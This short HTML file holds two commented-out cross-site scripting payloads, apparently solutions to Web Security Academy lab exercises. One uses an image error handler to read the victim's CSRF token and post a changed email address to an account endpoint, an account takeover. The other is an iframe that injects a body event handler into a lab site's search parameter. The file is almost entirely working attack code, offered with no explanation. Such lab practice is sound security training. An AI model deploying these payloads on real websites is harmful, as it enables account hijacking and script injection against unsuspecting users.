
<!-- Script Exploiting XSS to perform CSRF -->


<!-- <img src="image.jpg" alt="Alternative text" onerror="redirectToMyAccountPage();">

<script>
function redirectToMyAccountPage() {
  window.location.href = '/my-account';

  fetch('/my-account/change-email', {
    method: 'POST',
    mode: 'no-cors',
    body: 'email=test@test.com&csrf='+document.getElementsByName('csrf')[0].value
    })
  .then(response => {})
  .catch(error => {
    console.error(error);
  });
}
</script> -->


<!-- Script Reflected XSS into HTML context with most tags and attributes blocked -->

<!-- <iframe src="https://0a8b00be04b0f90cc020730e00cb00bd.web-security-academy.net/?search=<body onresize=print()>" onload="this.style.width='500px'"> -->
